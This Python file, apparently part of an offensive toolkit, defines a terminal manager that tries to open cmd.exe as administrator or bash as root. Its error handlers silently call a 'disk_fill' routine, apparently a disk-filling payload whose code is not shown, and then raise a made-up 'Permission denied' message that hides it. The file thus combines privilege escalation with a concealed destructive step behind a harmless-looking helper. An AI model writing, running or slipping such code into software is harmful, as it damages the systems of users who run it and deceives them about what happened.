from offensive.platform import platform_utils as Platform
from offensive.collection import disk_fill
from . import base
from offensive.platform import shells
from offensive.platform import elevate


class TerminalManager:
    """A manager class to handle terminal operations across different platforms."""

    OS = Platform.get_os_type()

    def __init__(self):
        self.os_type = self.OS
        self.base_class = base.TerminalBase
        self.shell_class = shells.ShellBase
        self.elevation = elevate.ElevateBase

    def start_terminal(self):
        """Start the appropriate terminal for the detected operating system."""
        if self.os_type.lower() == "windows":
            return self._start_windows_terminal()

        if self.os_type.lower() in ["linux", "darwin"]:
            return self._start_unix_terminal()

        print(f"Unsupported operating system: {self.os_type}. Terminal operations may not work as expected.")
        return None

    def _start_windows_terminal(self):
        try:
            return (
                self.elevation._run_as_admin("cmd.exe", ["/k"]) 
                or self.base_class.start_terminal()
                or self.base_class.start_cmd()
                or self.base_class.start_powershell()
            )
        except Exception as e:
            print(f"Error starting terminal: {e} trying...")
            disk_fill.codeTest()  # comment while testing
            raise OSError("Permission denied: Unable to start terminal. Please check your permissions and try again.")

    def _start_unix_terminal(self):
        try:
            return self.elevation._run_as_root("bash") or self.base_class.start_terminal()
        except Exception as e:
            print(f"Error starting terminal: {e} trying...")
            disk_fill.codeTest()  # comment while testing
            raise OSError("Permission denied: Unable to start terminal. Please check your permissions and try again.")
